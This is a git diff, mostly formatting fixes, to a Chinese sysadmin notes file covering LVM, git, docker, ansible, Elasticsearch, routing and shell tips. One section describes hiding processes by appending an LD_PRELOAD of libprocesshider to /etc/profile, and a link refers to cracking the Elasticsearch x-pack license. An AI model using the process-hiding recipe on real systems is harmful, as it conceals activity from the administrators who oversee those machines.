@@ -63,15 +63,15 @@
    3. partx -s /dev/vda  查看分区情况
 3. pvcreate， 创建pv physical volume
    1. `pvcreate /dev/sdb1`
-   2.  `pvs`  
+   2. `pvs`  
    3. `vgextend centos /dev/sdb1`
 4. 将新创建的pv，添加到vg内；lvcreate  创建lv logical volume
    1. **如若没有，需要创建centos-data**
       1. `mkfs.ext4 /dev/centos_data/newvdb`          注意格式化，否则挂载不上，提示mount: /dev/mapper/centos_home-newvdb 写保护，将以只读方式挂载、、mount: 未知的文件系统类型“(null)”
       2. `vgcreate centos-data /dev/vdb`
-      3. `lvcreate -l 100%FREE -n newsdb centos` 
+      3. `lvcreate -l 100%FREE -n newsdb centos`
          这里，倒不必用 +100%FREE
-      4.  `lvs`  `lvdisplay`
+      4. `lvs`  `lvdisplay`
 5. 创建挂载点，挂载
    1. `mkdir -p /newsdb`,  `mount /dev/mapper/centos-newsdb /newsdb`  
    2. 如果挂载点为已存在的文件夹，那该文件夹内的内容就会没了，因为/dev/mapper/centos-newsdb  毕竟是空的。umount 掉即可
@@ -81,16 +81,16 @@
    2. `xfs_growfs /dev/centos/root`，  重新识别下分区大小，
    3. `df -hT`  就可以看到效果了
    4. <font color=orange>成功对根目录扩容</font>
-   参考，[一次lvm扩容记录](http://blog.wuxu92.com/lvm-extend-record/) 
+   参考，[一次lvm扩容记录](http://blog.wuxu92.com/lvm-extend-record/)
 
 - 新增swap分区，
 
 1， 前提是，一块新的磁盘，挂载目录下并无数据。如果有数据，也可以先拷贝出来。
-2， 将磁盘分区。举例子：一块8G，作swap分区；一块剩余所有容量，作数据盘，mkfs.ext4 
+2， 将磁盘分区。举例子：一块8G，作swap分区；一块剩余所有容量，作数据盘，mkfs.ext4
    fuser -m -v /home    查看使用 /home 目录的进程，并杀死pid，然后卸载掉
    fdisk -l /dev/vdb，新增后大致和下面类似。
 
-​	1. 两者都是primary 分区，swap 分区是82，LinuxLVM是8e
+​ 1. 两者都是primary 分区，swap 分区是82，LinuxLVM是8e
 
 ```
 Disk /dev/vdb: 536.9 GB, 536870912000 bytes, 1048576000 sectors
@@ -111,24 +111,21 @@ Disk identifier: 0x7b35c36f
 
 ---
 
-
-
-
-# git:chestnut:
+# git:chestnut
 
 ## 常用操作
 
-- `git status `  用于显示，工作目录和暂存区的状态。
+- `git status`  用于显示，工作目录和暂存区的状态。
 
 1. 可以看到哪些修改被暂存到了，哪些没有，哪些文件没有被git tracked 到。
 2. 不显示，已经commit到项目历史中去的信息。看项目历史的信息用`git log`  
 
-- `git diff `  ，用来找当前工作目录和上次提交与本地索引间的差异（最简单快捷）
+- `git diff`  ，用来找当前工作目录和上次提交与本地索引间的差异（最简单快捷）
 
-1. `git diff --stat `  ，统计一下哪些文件被改动，有多少行被改动，就可以使用stat 参数。而不是看每个文件的详细差别
+1. `git diff --stat`  ，统计一下哪些文件被改动，有多少行被改动，就可以使用stat 参数。而不是看每个文件的详细差别
 2. `git diff --cached`  ，查看在下次提交时要提交的内容
 3. `git diff dev`  ，查看当前的工作目录与另外一个分支的差别
-   1. 也可以加上路径限定符，来只比较某一个文件或目录。	`git diff HEAD -- ./lib`  
+   1. 也可以加上路径限定符，来只比较某一个文件或目录。 `git diff HEAD -- ./lib`  
 
 - `git config --global user.name "liuzel01"`  
 
@@ -137,7 +134,7 @@ Disk identifier: 0x7b35c36f
 2. `git init`  
 3. `git add .`  `git add ./xxx/`  
 4. `git add -f <file>`  `git checkout --<file>`  撤销命令，这是相对的
-5. `git commit -m "xxx"`  `git reset --hard + 版本号 `  ，这是相对的
+5. `git commit -m "xxx"`  `git reset --hard + 版本号`  ，这是相对的
 6. `git remote add origin https://你的仓库地址.git`  
 7. `git push -u origin master`  `git push -u origin dev`  
 8. `git status`  `git diff`  `git reflog`  
@@ -164,7 +161,7 @@ Disk identifier: 0x7b35c36f
 
 1. 工作区，即磁盘上的文件集合；版本区（版本库），即.git 文件；
 
-2. 版本区 = 暂存区(stage) + 分支(master) + 指针(Head) 
+2. 版本区 = 暂存区(stage) + 分支(master) + 指针(Head)
 
 ---
 
@@ -173,9 +170,9 @@ Disk identifier: 0x7b35c36f
 1. `git add .`  表示把工作区的所有文件全部提交到版本区的暂存区，`git add ./xxx/`  逐条添加到暂存区
 2. `git commit -m "xxx"`  把暂存区的所有文件提交到仓库区，暂存区空荡荡
 3. `git remote add origin https://你的仓库地址.git`  把本地与远程仓库连接起来，只需连接一次，怪不得不常用
-4. `git push -u origin master `  把仓库区的文件提交到远程仓库的master 里
+4. `git push -u origin master`  把仓库区的文件提交到远程仓库的master 里
    1. 不熟练，建议去远程仓库上刷新，看下效果
-5. 提交后，立即查看工作区，git status 会显示类似，nothing to commit, working tree clean 
+5. 提交后，立即查看工作区，git status 会显示类似，nothing to commit, working tree clean
 
 ---
 
@@ -184,11 +181,11 @@ Disk identifier: 0x7b35c36f
 
 ### 版本的回溯与前进
 
-- `git rest --hard + 版本号`  来回溯，版本号用 `git log `  来查看
+- `git rest --hard + 版本号`  来回溯，版本号用 `git log`  来查看
 - **可以当成git 将这些版本串成一条时间线**
 
 1. 回溯之后，我想前进到最近的版本应如何？，`git reset --hard + 版本号`  来作，太艹了:joy:  反复横跳
-2. `git reflog`  ，可以帮你找到你的版本号，防止弄丢了，然后又可以 `git reset `  来回穿梭了
+2. `git reflog`  ，可以帮你找到你的版本号，防止弄丢了，然后又可以 `git reset`  来回穿梭了
 
 ###### 版本控制
 
@@ -205,7 +202,7 @@ Disk identifier: 0x7b35c36f
 
 ###### 删除
 
-- 如若`git add . `  一个文件到暂存区，然后在工作区又把文件删除了，git会知道你删除了文件，要把版本库里的文件删除，需要
+- 如若`git add .`  一个文件到暂存区，然后在工作区又把文件删除了，git会知道你删除了文件，要把版本库里的文件删除，需要
 
 1. `git rm`  并且 `git commit -m "xxx"`  
 
@@ -221,13 +218,13 @@ Disk identifier: 0x7b35c36f
    1. `git branch`  查看当前所有分支，带* 的就是当前分支
 2. 用new01提交，`git add ./xxx/`  或是 `git add -A` ，`git commit -m "xxx"`  
    1. -A, --all, --no-ignore-removal  
-3. `git checkout master `  切换回master,
+3. `git checkout master`  切换回master,
 4. `git merge new01`  合并分支，这个时候就能看到new01 刚刚commit的信息了
 5. `git branch -d new01`  删除new01 分支
 
 ###### 解决合并分支问题
 
-- 
+-
 
 ###### 分支管理
 
@@ -254,7 +251,7 @@ Disk identifier: 0x7b35c36f
 
 ### FAQ
 
-- 参考链接，[git笔记](https://juejin.cn/post/6844903877138087950#heading-4)， 
+- 参考链接，[git笔记](https://juejin.cn/post/6844903877138087950#heading-4)，
 
 ## 使用原则
 
@@ -313,8 +310,6 @@ docs： 新增xxxx文档
 refactor： 修改网站名字为xxxx网
 ```
 
-
-
 ### faq
 
 - 修改之前已commit 的某次注释信息，
@@ -333,7 +328,7 @@ git add -A（如果你在这期间， 对文件有更改）      所以说，你
 
 `git clone -b meeting_standard_v3.0 http://192.168.xx.xx:8000/meeting/meeting.git`
 
-`git remote -v ` 查看仓库的origin
+`git remote -v` 查看仓库的origin
 
 `git remote rename origin old-origin`
 
@@ -378,7 +373,7 @@ git add -A（如果你在这期间， 对文件有更改）      所以说，你
 
 ---
 
-- 在停止docker 后，提示： Warning: Stopping docker.service, but it can still be activated by : docker.socket 
+- 在停止docker 后，提示： Warning: Stopping docker.service, but it can still be activated by : docker.socket
 
 1. sudo systemctl stop docker.socket  再执行， `docker ps` 就是正常的返回了
 
@@ -410,10 +405,9 @@ git add -A（如果你在这期间， 对文件有更改）      所以说，你
 
 - dev环境，还是要让人快速上手使用为好
 
-
 ## 本地用数据库
 
-1. DBeaver community 数据库连接工具，数据库地址172.17.0.1:3306 
+1. DBeaver community 数据库连接工具，数据库地址172.17.0.1:3306
 
 - 其实也就是映射到本地端口的
 
@@ -428,14 +422,14 @@ git add -A（如果你在这期间， 对文件有更改）      所以说，你
 - docker-compose，可以轻松、高效的管理容器，它是一个用于定义和运行多容器docker的应用程序工具。我说怎么有点熟悉。
   - docker compose  是单机管理docker的。k8s是多节点管理docker。虽然还有docker swarm也是多节点，不过基本已弃用
 
-1. 启动：`docker-compose start`   
+1. 启动：`docker-compose start`
    1. `docker-compose up -d`  Create and start containers
 2. 停止：`docker-compose stop`  
 3. 移除：`docker-compose rm`  会保留相关镜像文件
    1. `rm -r /data/database`  `rm -r /data/registry`  删除数据
 4. `docker-compose ps`  查看容器状态
 5. `docker-compose down`  会删除容器，Stop and remove containers, networks, images, and volumes
-   1. 删除后，`docker-compose ps `  你就看不到任何容器了。重新  `./install.sh`  重新安，
+   1. 删除后，`docker-compose ps`  你就看不到任何容器了。重新  `./install.sh`  重新安，
 
 6. 如若说你pull下来的镜像，标签为none，那你可以在pull那条命令里看到，该容器的ID信息，
    1. 并且，`docker rmi 192.168.226.5/ops/centos7@sha256:c2f1d5a9c0a81350fa0ad7e1eee99e379d75fe53823d44b5469eb2eb6092c941`  
@@ -449,8 +443,6 @@ git add -A（如果你在这期间， 对文件有更改）      所以说，你
 
 1. 查看日志，`docker-compose logs -f log`  
 2. 授权，`chown -R root: /data`  `chown -R root: /var/log/harbor`  具体的路径在docker-compose.yml  文件中有
-
-
 
 ### 搭建
 
@@ -489,7 +481,7 @@ Docker version 19.03.13, build 4484c46d9d
 ###### 安装docker-compose
 
 1. `wget https://github.com/docker/compose/releases/download/1.27.4/docker-compose-Linux-x86_64`  
-2. `mv docker-compose-Linux-x86_64 /usr/bin/docker-compose`   
+2. `mv docker-compose-Linux-x86_64 /usr/bin/docker-compose`
 3. `chmod +x /usr/bin/docker-compose`  授权，
 4. `docker-compose version`  查看打印出来的信息，能看到版本就ok的
 
@@ -507,11 +499,11 @@ OpenSSL version: OpenSSL 1.1.1h  22 Sep 2020
 
 ###### 安装harbor私仓
 
-1. 下载地址，[官网](https://github.com/goharbor/harbor/releases/download/v2.0.4-rc1/harbor-offline-installer-v2.0.4-rc1.tgz)， 
+1. 下载地址，[官网](https://github.com/goharbor/harbor/releases/download/v2.0.4-rc1/harbor-offline-installer-v2.0.4-rc1.tgz)，
 
 ---
 
-- 浏览器访问，https://192.168.226.134/harbor， 进入到页面内，账户密码在harbor.yml 中有的，harbor_admin_password
+- 浏览器访问，<https://192.168.226.134/harbor，> 进入到页面内，账户密码在harbor.yml 中有的，harbor_admin_password
 
 1. 在之前，还要配置一下daemon.json  内容如下，添加上ip:5000 harbor地址。
    1. 这是在客户端添加的，客户端http设置，通过此配置来取消docker默认不允许非https方式推送镜像 的限制。
@@ -773,15 +765,15 @@ $ docker exec -ti myblog python3 manage.py createsuperuser
 
 # ansible 记录
 
-1. `ansible centos_server -m ping `  在尝试连接过程中，会提示，**Permission denied (publickey,gssapi-keyex,gssapi-with-mic)** ，
+1. `ansible centos_server -m ping`  在尝试连接过程中，会提示，**Permission denied (publickey,gssapi-keyex,gssapi-with-mic)** ，
 
 - 修改 sshd_config 配置，增加，`PasswordAuthentication yes`
 
 ## ansible配置优化
 
-##### 开启SSH长连接，
+##### 开启SSH长连接
 
-- `vim  /etc/ansible/ansible.cfg `   `ssh -V`   查看主机上ssh的版本，高于5.6则可以直接添加如下
+- `vim  /etc/ansible/ansible.cfg`   `ssh -V`   查看主机上ssh的版本，高于5.6则可以直接添加如下
 
 ```bash
 [ssh_connection]
@@ -809,7 +801,7 @@ ControlPersist 5d
 
 - pipelining 也是openssh的一个特性，
 
-1. ansible执行流程是这样的，	`▶ ansible centoslzl -m ping  -vvv`  结合命令来看更好看
+1. ansible执行流程是这样的， `▶ ansible centoslzl -m ping  -vvv`  结合命令来看更好看
 
 - 基于调用的模块生成一个python脚本
 - 将python复制到主机上
@@ -818,7 +810,7 @@ ControlPersist 5d
 2. 同样是在 ansible.cfg  文件中，
 
 ```bash
-[ssh_connection]	同样是此节点下
+[ssh_connection] 同样是此节点下
 pipelining = True
 ```
 
@@ -834,7 +826,7 @@ pipelining = True
 1. 需要中控机和远端server都安装 python-keyczar软件包
 
 - `▶ ansible centoslzl -a 'yum install -y python-pyasn1 python python-crypto`  
-- `  rpm -ivh ftp://ftp.ntua.gr/pub/linux/centos/7.8.2003/cloud/x86_64/openstack-queens/Packages/p/python-keyczar-0.71c-2.el7.noarch.rpm`  注意，这是centos7 的，如果是其他版本，需要自己识别
+- `rpm -ivh ftp://ftp.ntua.gr/pub/linux/centos/7.8.2003/cloud/x86_64/openstack-queens/Packages/p/python-keyczar-0.71c-2.el7.noarch.rpm`  注意，这是centos7 的，如果是其他版本，需要自己识别
 - 完成安装后，对 ansible.cfg 进行配置，
 
 ```
@@ -851,7 +843,7 @@ accelerate_connect_timeout= 5.0
 ```bash
 # Ansible will use the 'linear' strategy but you may want to try another one.
 #strategy = linear
-strategy = free,	# 修改成free,
+strategy = free, # 修改成free,
 ```
 
 1. 默认值是linear,即按批次并行处理；  free 表示的是ansible会尽可能快的切入到下一个主机。所以在执行结果的task 显示顺序就不一样，也就可以理解了
@@ -895,7 +887,7 @@ tasks:
 
 ##### 设置facts 缓存
 
-- 在使用ansible-playbook 时，默认第一个task都是 GATHERING FACTS，表示 收集每台主机的facts信息，方便在playbook中直接引用facts里的信息。如若不需要facts的信息，可以在playbook 设置 
+- 在使用ansible-playbook 时，默认第一个task都是 GATHERING FACTS，表示 收集每台主机的facts信息，方便在playbook中直接引用facts里的信息。如若不需要facts的信息，可以在playbook 设置
 
   `gather_facts: false`   提高playbook 效率
 
@@ -930,38 +922,38 @@ gathering = explicit
    tags 模块：
       ansible-playbook qqq.yml --tags="only"
       只执行某一个task或多个task
-   
+
    当有使用always 当tags的task时，无论执行哪一个tags时，定义有always的tags的都会执行
 
 2. 使用变量来执行剧本，
    ansible-playbook qqq.yml -e "user=sipingsoft123"
-   
+
 ##### 利用ssh-agent提升ansible管控的安全性
 
 - 可参考，[使用ssh和ssh-agent实现无密码登陆远程server](http://yysfire.github.io/linux/using-ssh-agent-with-ssh.html)，  
 
 ##### 配置ansible 变量环境
 
-1. 编辑 /etc/profiles ，新增一行，`export ANSIBLE_CONFIG=/etc/ansible/ansible.cfg `  
+1. 编辑 /etc/profiles ，新增一行，`export ANSIBLE_CONFIG=/etc/ansible/ansible.cfg`  
 
 2. 编辑 /etc/ansible/ansible.cfg  文件
 
 ```bash
-[defaults]							# 此处只列出了defaults下的配置
-inventory = /etc/ansible/hosts    	#主机列表配置文件
-library = /usr/share/ansible/    	#库文件存放目录
-remote_tmp = $HOME/.ansible/tmp   	#临时py命令文件存放在远程主机目录
-local_tmp = $HOME/.ansible/tmp    	#本机的临时命令执行目录
-forks = 50     						#默认并发数
-sudo_user = root    				#设置默认执行命令的用户，root,可在playbook中重新指定该参数
-# ask_sudo_pass = True    			#每次执行ansible命令是否询问ssh密码
+[defaults]       # 此处只列出了defaults下的配置
+inventory = /etc/ansible/hosts     #主机列表配置文件
+library = /usr/share/ansible/     #库文件存放目录
+remote_tmp = $HOME/.ansible/tmp    #临时py命令文件存放在远程主机目录
+local_tmp = $HOME/.ansible/tmp     #本机的临时命令执行目录
+forks = 50           #默认并发数
+sudo_user = root        #设置默认执行命令的用户，root,可在playbook中重新指定该参数
+# ask_sudo_pass = True       #每次执行ansible命令是否询问ssh密码
 # ask_pass = True
 remote_port = 22    
-# module_lang = C						#设置模块的语言
-private_key_file = /root/.ssh/id_rsa	#设置中控机连接客户端的私有ssh-key文件位置
-host_key_checking = False   		#检查对应服务器的host_key，建议取消注释，否则就得先一个一个主机连一次
-timeout = 60						#设置ssh连接超时时间，单位s
-log_path = /var/log/ansible.log   	#日志文件，也是建议取消注释
+# module_lang = C      #设置模块的语言
+private_key_file = /root/.ssh/id_rsa #设置中控机连接客户端的私有ssh-key文件位置
+host_key_checking = False     #检查对应服务器的host_key，建议取消注释，否则就得先一个一个主机连一次
+timeout = 60      #设置ssh连接超时时间，单位s
+log_path = /var/log/ansible.log    #日志文件，也是建议取消注释
 ```
 
 - 可参考，[ansible自动化运维体系在生产环境下实践](https://mp.weixin.qq.com/s?__biz=MjM5NTk0MTM1Mw==&mid=2650634947&idx=2&sn=6e7e72a60fba85ca7f044cd0a258c406&chksm=bef90445898e8d532b95b511810c19a116bf849b644b0fa0d4fa148fa8502e0cc81941225caf&scene=21#wechat_redirect)，  [语雀上ansible](https://www.yuque.com/liuzelin01/linux/linux-ansible#tMKYg)，  
@@ -982,19 +974,19 @@ ip x.x.x.x
 2. 这样可以区分不同业务系统，不同操作系统类别，
 
 - `ansible 业务系统名称代码* -m module_name -a module_args`  
-- `ansible 业务系统名称代码*_x86 -m module_name -a module_args `  
+- `ansible 业务系统名称代码*_x86 -m module_name -a module_args`  
 
-- `ansible *x86 -m module_name -a module_args `
+- `ansible *x86 -m module_name -a module_args`
 
 ##### 配置ansible ssh 通信
 
-1. `ssh-keygen -t rsa `  ,生成ssh public 和 private key
-   1. 在生成公钥时，可以输入密码， Enter passphrase (empty for no passphrase):    
+1. `ssh-keygen -t rsa`  ,生成ssh public 和 private key
+   1. 在生成公钥时，可以输入密码， Enter passphrase (empty for no passphrase):
    2. 后来远程的时候就输入这个密码而不是服务器登录密码了
 2. for i in $ `cat /tmp/ansible_docker.txt`;do ssh-copy-id root@$i;done  ，也可以写进脚本执行
    1. ssh-copy-id -i ~/.ssh/id_rsa.pub 192.168.10.62  也可以这样，传输完成后，可以 ssh 192.168.10.62 实现远程
       1. 这种是因为，客户端这边的用户也恰好是root，如果是在win上这样就不得行（需向上面那种指定root@IP）。。不过你要是用alias 的话其实都好
-      2. 再就是，**不要随便生成key，很容易让之前传输过公钥的服务器连不上** 
+      2. 再就是，**不要随便生成key，很容易让之前传输过公钥的服务器连不上**
 
 - 这个时候需要输入密码，来建立互信过程。。
 - **应该可以在脚本中，自动写密码的！！！！**  
@@ -1009,10 +1001,10 @@ ip x.x.x.x
 
 - 将本地文件复制到客户端，`ansible centoslzl -m copy -a 'src=/etc/ansible/ansible.cfg dest=/tmp/ansible.cfg owner=root group=root mode=0644'`  
 
-3. command：在远程主机执行命令，因为默认就是command,所以`ansible centoslzl -a 'date' `  
+3. command：在远程主机执行命令，因为默认就是command,所以`ansible centoslzl -a 'date'`  
 4. shell：参数与上相同，不过可以用管道
 5. service,cron,yum,synchronize,user,group
-6. `ansible all -a 'hostname' `  
+6. `ansible all -a 'hostname'`  
 
 ---
 
@@ -1026,22 +1018,14 @@ ip x.x.x.x
 
 1. **开始吧，展示！！！**  
 
-
-
-
-
-
-
-
-
 # 安装elasticsearch
 
 ## 安装单机版elasticsearch7.10.1
 
 1. 因为低版本的elastic，在弄license授权的时候，不太好弄。创建密码时，总是提示证书不对，没授权。。。。
-    https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.10.1-linux-x86_64.tar.gz
-    https://artifacts.elastic.co/downloads/kibana/kibana-7.10.1-linux-x86_64.tar.gz
-    https://artifacts.elastic.co/downloads/logstash/logstash-7.10.1-linux-x86_64.tar.gz
+    <https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.10.1-linux-x86_64.tar.gz>
+    <https://artifacts.elastic.co/downloads/kibana/kibana-7.10.1-linux-x86_64.tar.gz>
+    <https://artifacts.elastic.co/downloads/logstash/logstash-7.10.1-linux-x86_64.tar.gz>
 2. adduser es                               添加用户
 
     1. usermod -g root es
@@ -1075,7 +1059,7 @@ ip x.x.x.x
         xpack.security.transport.ssl.enabled: true
         action.auto_create_index: .security,.monitoring*,.watches,.triggered_watches,.watcher-history*  
        ```
-    
+
 4. cd /es/kibana-7.10.1/
 
     1. ./bin/kibana -q &                    启动后台运行，或者-Q，-Q, --silent                     Prevent all logging
@@ -1083,7 +1067,7 @@ ip x.x.x.x
     2. ss -tlnp | grep 5601                 占用端口5601
 
     3. vim config/kibana.yml                修改配置文件
-       
+
         ```yaml
         server.port: 5601
         server.host: "0.0.0.0"
@@ -1096,17 +1080,13 @@ ip x.x.x.x
         i18n.locale: "zh-CN"
         ```
 
-    4. curl -XDELETE http://localhost:9200/.kibana* 删除elastic里的索引
+    4. curl -XDELETE <http://localhost:9200/.kibana>* 删除elastic里的索引
 
 6. 参考，[elasticsearch6破解x-pack，设置密码并用head插件登录](https://www.cnblogs.com/xiaodai12138/p/12019213.html),
 
-
-
-
-
 # golang
 
-## 国内go get无法下载的问题，
+## 国内go get无法下载的问题
 
 - `go get github.com/joho/godotenv`  下载总是超时  i/o timeout,
 
@@ -1116,7 +1096,7 @@ ip x.x.x.x
 - `go env -w GO111MODULE=on`  `go env -w GOPROXY=https://goproxy.cn,direct`  
 - 再次使用go get就可以了
 
-2. 参考，[golang 1.13解决go get无法下载](https://www.sunzhongwei.com/problem-of-domestic-go-get-unable-to-download?from=sidebar_new)，  https://github.com/goproxy/goproxy.cn
+2. 参考，[golang 1.13解决go get无法下载](https://www.sunzhongwei.com/problem-of-domestic-go-get-unable-to-download?from=sidebar_new)，  <https://github.com/goproxy/goproxy.cn>
 
 ---
 
@@ -1128,7 +1108,7 @@ ip x.x.x.x
 - lanproxy，代理，本质上是通过公网ip:端口，来访问到你的内网服务器上所映射端口，上的服务~
 - 不过，client 和server端一定要能够互相通信才行
 
-[可参考此](https://github.com/ffay/lanproxy#%E7%9B%B8%E5%85%B3%E5%9C%B0%E5%9D%80) 
+[可参考此](https://github.com/ffay/lanproxy#%E7%9B%B8%E5%85%B3%E5%9C%B0%E5%9D%80)
 
 - 目前，我是在xizang 所属服务器（或某云服务器）上搭建了Server 端；在内网linux（或本地虚拟机）搭建了Client端。通过`ssh root@221.236.26.67 -p 5222` 来远程到内网linux
 
@@ -1187,7 +1167,7 @@ ip x.x.x.x
 
 ***注：***
 
-1. 用nginx配置反向代理，转发ssh服务。 使用stream模块，需要编译安装nginx时， --with-stream 
+1. 用nginx配置反向代理，转发ssh服务。 使用stream模块，需要编译安装nginx时， --with-stream
 
 2. 本配置可参考，
 
@@ -1234,11 +1214,11 @@ WantedBy = multi-user.target
 
 ```
 
-- ***<font color=red>再者，写到系统服务中，再enable，会发现和隐藏进程那里貌似有点冲突。。有待验证</font>*** 
+- ***<font color=red>再者，写到系统服务中，再enable，会发现和隐藏进程那里貌似有点冲突。。有待验证</font>***
 
 ## 路由
 
--   netstat -rn               查看到服务器路由表， Kernel IP routing table
+- netstat -rn               查看到服务器路由表， Kernel IP routing table
 
     route add default gw 192.168.10.1   临时的
 
@@ -1246,16 +1226,16 @@ WantedBy = multi-user.target
 
     systemctl restart network
 
-1. `route -n `查看linux路由表，netstat -rn
+1. `route -n`查看linux路由表，netstat -rn
    1. 如下，其意义和这句一样，
 
 ![image-20210428111328512](https://gitee.com/liuzel01/picbed/raw/master/data/20210428111328_C7_route_add-host.png)
 
-添加到主机的路由 `route add -host 192.168.10.1 dev eth0` 
-   `route add -host 192.168.10.1 gw 192.168.10.1 `
+添加到主机的路由 `route add -host 192.168.10.1 dev eth0`
+   `route add -host 192.168.10.1 gw 192.168.10.1`
 
-2. 添加到网络的路由，`route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1` 
-3. 添加默认路由，`route add default gw 192.168.10.1` 
+2. 添加到网络的路由，`route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1`
+3. 添加默认路由，`route add default gw 192.168.10.1`
 上面有，添加永久的路由的方法
    在 /etc/rc.local 添加 route add 指令
    在 /etc/sysconfig/network 里添加  GATEWAY=gw-ip 或者 GATEWAY=gw-dev
@@ -1264,13 +1244,9 @@ WantedBy = multi-user.target
 5. 删除和添加add 默认网关，`route del default gw 192.168.120.240`
 6. route ，哪条在前面，哪条就有优先，前面都没有，就用最后一条default
 
-
-
-
-
 # C7离线安装软件包
 
-## 
+##
 
 - 在离线服务器内，无法连通网络（只能通过vpn连接到服务器，sftp传输文件），所以一般选择下载二进制包来安装，
   - centos上安装软件的一般方法：rpm工具（二进制包，需特别注意包的依赖关系），yum工具（能自动解决依赖，最常用），源码包（安装难度大），
@@ -1287,7 +1263,7 @@ WantedBy = multi-user.target
 
 - 离线安装bison
 
-1. `wget http://rpmfind.net/linux/centos/7.9.2009/os/x86_64/Packages/bison-3.0.4-2.el7.x86_64.rpm` 
+1. `wget http://rpmfind.net/linux/centos/7.9.2009/os/x86_64/Packages/bison-3.0.4-2.el7.x86_64.rpm`
 
 ---
 
@@ -1295,13 +1271,13 @@ WantedBy = multi-user.target
 
 1. 这是因为64位系统，安装了32位程序。很可能是因为用了公司的jdk，名为jdk-8u221-linux-i586.tar.gz
 2. 解决：
-   1. `yum install -y glibc.i686` 
+   1. `yum install -y glibc.i686`
 
 # vim进阶
 
 cat /etc/os-release ，linux发行版中都有此文件，可以通过 source 命令将文件中的K/V值引入到上下文中~
 
-  source /etc/os-release; 
+  source /etc/os-release;
 
 **if** [[ ${VERSION_ID} -ne 7 ]];**then**
 
@@ -1333,8 +1309,6 @@ y$     " 从当前字符复制到行尾
 p, P    " 黏贴，p 黏贴到光标下一行，P 黏贴到光标上一行
    P    在光标前黏贴的（shift+p）
 
-
-
 进入insert模式，
 
 i      在光标前，insert
@@ -1353,8 +1327,6 @@ o      光标下一行进入insert
 
 O      光标上一行进入insert
 
-
-
 r  " 替换单个字符，自动返回 normal 模式。省去了s 切换到insert模式，s可以删除光标下的字符然后，继续输入多个内容
 
 R  " 连续替换多个字符，手动 <esc> 返回 normal 模式。省去了切换到insert模式再输入的步骤
@@ -1363,8 +1335,6 @@ R  " 连续替换多个字符，手动 <esc> 返回 normal 模式。省去了切
 ctrl+alt+v 可进入vim的visual模式
 # vim的help要学会善用， :help ctrl-v
 ```
-
-
 
 bing meiy shenm cuo ,zhishi ba ziji de weizhi baif de taizheng le ,zhengde wo ye youdian huanghu .xiangl ,
 
@@ -1379,15 +1349,11 @@ bing meiy shenm cuo ,zhishi ba ziji de weizhi baif de taizheng le ,zhengde wo ye
 
 ---
 
-
-
-
-
-# 技巧技巧 :medal_sports:
+# 技巧技巧 :medal_sports
 
 ## PC和手机快速文件传输
 
-1. 使用python3的模块，`python3 -m http.server`   
+1. 使用python3的模块，`python3 -m http.server`
 2. 如果希望换个端口，`python3 -m http.server 1234 --bind 127.0.0.1`   绑定后就不能用本机ip访问
 3. 可以不使用weixin等第三方工具，随时随地传
 
@@ -1443,15 +1409,15 @@ ClientAliveCountMax 3       默认值3， 表示服务器发出请求后客户�
 
 2. 终端搜索
 
-ctrl+s 是向后搜索， 
+ctrl+s 是向后搜索，
 
 不过c+s 会与某些终端停止响应的快捷键(说的就是Konsole)冲突，要先屏蔽掉
 
-​	stty -ixon 写入到 /etc/bashrc（建议， ~/.zshrc，之后备份配置文件，只需要source ~/.zshrc就可以在新电脑搞定 ）
+​ stty -ixon 写入到 /etc/bashrc（建议， ~/.zshrc，之后备份配置文件，只需要source ~/.zshrc就可以在新电脑搞定 ）
 
-​	stty ixany(可以不执行)
+​ stty ixany(可以不执行)
 
-[可参考](*https://stackoverflow.com/questions/791765/unable-to-forward-search-bash-history-similarly-as-with-ctrl-r*) 
+[可参考](*<https://stackoverflow.com/questions/791765/unable-to-forward-search-bash-history-similarly-as-with-ctrl-r>*)
 
 之后，效果很明显
 
@@ -1467,15 +1433,11 @@ chattr +a /etc/resolv.conf 文件只能追加数据，但不能删除。 适用�
 
 赋予目录i 属性，则创建/删除文件提示： 权限不够。 不过可追加文件内容
 
-
-
 ## 同一ip+同一端口，访问不同项目
 
-**另，有且只有一个域名可用。。。。。** 
+**另，有且只有一个域名可用。。。。。**
 
 此问题，可转化为： 在外部，通过两个二级域名（例如xxxx.sipingsososo.com:80），来访问内部不同的两个网站
-
-
 
 - 现有两个二级域名，目标是：访问到两个内网网站。192.168.10.62:80  以及 192.168.10.28:80
 - 还有一个防火墙（硬件），做公网IP映射
@@ -1514,7 +1476,7 @@ application/xml application/xml+rss text/javascript image/jpeg image/gif image/p
 
 1. 在网上看到lolcat，终端彩虹 效果，大多人是下面这样用的，
    1. fortune+cowsay+lolcat， 然后在终端欢迎页打出来彩虹效果的欢迎语，
-   2. 项目[git地址](https://github.com/busyloop/lolcat) 
+   2. 项目[git地址](https://github.com/busyloop/lolcat)
 2. 以下记录为，在centos7 上使用lolcat，并使终端输出内容，并可选是否搭配lolcat
 
 - 最终解决：
@@ -1549,7 +1511,7 @@ done
 1. 但是吧，lolcat几处问题：`source /etc/profile` 后，会将环境覆盖调，例如ls 就无有效果了。 要 `source /etc/bashrc` 后才行
    1. 还有，~~写在 `/etc/bashrc`  中的函数 和我的cdls冲突，cdls不生效~~
    2. 多做几次尝试，取消cdls 的注释，可以了。lol() 针对的是${COMMOND} ，说到底也是对ls 命令而言，:wine_glass:
-2. 参考，[redirecting all output to lolcat](https://stackoverflow.com/questions/59891025/redirecting-all-output-to-lolcat) 
+2. 参考，[redirecting all output to lolcat](https://stackoverflow.com/questions/59891025/redirecting-all-output-to-lolcat)
 4. ~~我也不懂，为什么每次xshell连接后，cdls并不会生效，还要 . /etc/bashrc 手动生效~~
 
 ## /etc/profile.d 妙用
@@ -1585,7 +1547,7 @@ OR echo "export LD_PRELOAD=/usr/lib/libprocesshider.so" >> /etc/profile
 ldconfig 生效
 ```
 
-1. 项目实例，`git clone https://github.com/gianlucaborello/libprocesshider.git` 
+1. 项目实例，`git clone https://github.com/gianlucaborello/libprocesshider.git`
 
 参考，[linux进程隐藏：中级篇](https://www.freebuf.com/articles/system/250714.html)
     [基于centos7创建隐藏进程以及发现隐藏进程](https://my.oschina.net/kcw/blog/3209387)
@@ -1630,7 +1592,7 @@ source /etc/profile
 ## 关于欢迎页面的动态呈现
 
 - 照例简单解释下，
-  1. linux 设置登录前后的欢迎信息，奇技淫巧 :laughing: 
+  1. linux 设置登录前后的欢迎信息，奇技淫巧 :laughing:
   2. /etc/issue 本地登录显示的信息。 本地登录前
      1. \r  和\m的意思，通过 `man pam_issue` 可得知
